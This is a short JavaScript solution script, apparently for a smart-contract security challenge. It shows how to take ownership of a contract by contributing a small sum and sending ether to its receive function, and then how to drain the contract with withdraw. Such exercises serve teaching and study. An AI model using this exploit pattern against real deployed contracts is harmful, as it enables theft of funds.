// Step 1: Make a little bit contribution to the contract
// So that our address appeared inside the contribution array
await contract.contribute.sendTransaction({
    from: player,
    // Must be less than 0.001 ether
    value: toWei('0.0001'),
});

// Step 2: send transaction to trigger the "receive" function
await sendTransaction({
    from: player,
    to: contract.address,
    // Any amount
    value: toWei('0.0001'),
});

// Step 3: Withdraw everything
await contract.withdraw();
